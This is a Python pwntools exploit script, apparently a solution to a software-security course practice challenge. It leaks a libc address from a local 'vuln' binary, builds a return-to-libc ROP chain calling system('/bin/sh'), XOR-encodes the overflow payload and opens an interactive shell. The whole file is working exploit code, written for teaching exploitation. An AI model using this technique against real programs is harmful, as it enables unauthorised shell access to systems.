#!/usr/bin/env python3

import pwn
import socket
import threading

pwn.context.terminal = ['gnome-terminal', '--']

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("/lib/libc.so.6")

conn = pwn.process([exe.path])

pwn.gdb.attach(conn, gdbscript="""
set detach-on-fork off
set follow-fork-mode child
""")

# we need to send 16 bytes
conn.sendlineafter(b'If it bleeds, we can kill it.', b'Get to')
conn.recvuntil(b'Chopper location at 0x')
printf_address = conn.recvline()
print(printf_address)
printf_address = int(printf_address[:-1], 16)
print(hex(printf_address))

libc.address = printf_address - libc.symbols['printf']
print(f'libc at: {hex(libc.address)}')

# do a simple ropchain (and xor stuff onto it)
rop = pwn.ROP(libc)
rop.call(rop.ret) # this is needed for aligned sothat syscall is 16 byte aligned
# call system, so jump to this address and set parameter beforehand
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = b'A'*(16+8) + rop.chain()
print(payload)

# add the xor stuff
new_payload = b''
data = [b for b in b'Stick around']
for pos, byte in enumerate(payload):
    new_payload += pwn.p8(byte ^ data[pos%12])
print(new_payload)

conn.sendline(new_payload)

conn.interactive()
